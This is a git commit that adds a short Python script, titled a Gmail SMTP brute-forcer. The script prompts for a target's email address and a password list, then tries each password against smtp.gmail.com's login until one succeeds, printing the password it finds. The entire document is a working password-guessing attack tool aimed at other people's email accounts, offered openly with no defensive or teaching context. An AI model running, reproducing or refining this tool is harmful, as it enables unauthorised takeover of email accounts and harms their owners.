b7002a3542f9655db5bf54ad558ddcf7d4571e1b
nirgranthi <223480893+nirgranthi@users.noreply.github.com>
2025-12-15 19:56:26 +0530

    smtp gmail bruteforcer

---
+++ gmail smtp bruteforcer.py
@@ -0,0 +1,28 @@
+import smtplib 
+from termcolor import colored 
+
+try:
+	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+	smtpserver.ehlo() 
+	smtpserver.starttls()
+	
+	usr = input("[*] Enter target's email address: ") 
+	try:
+		pwdfile = input("[*] Enter name of the password file: ") 
+		file = open(pwdfile, 'r')
+	except:
+		print('\nPassword file not found')
+		print('Exiting program......')
+		exit()
+	
+	for pwd in file:
+		pwd = pwd.strip('\n')
+		try:
+			smtpserver.login(usr, pwd)
+			print(colored("[*] Password found: " + pwd, 'green'))
+			break 
+	
+		except smtplib.SMTPAuthenticationError:
+			print(colored('[*] Wrong password: ' + pwd, 'red'))
+except:
+	print('Error in network or something')
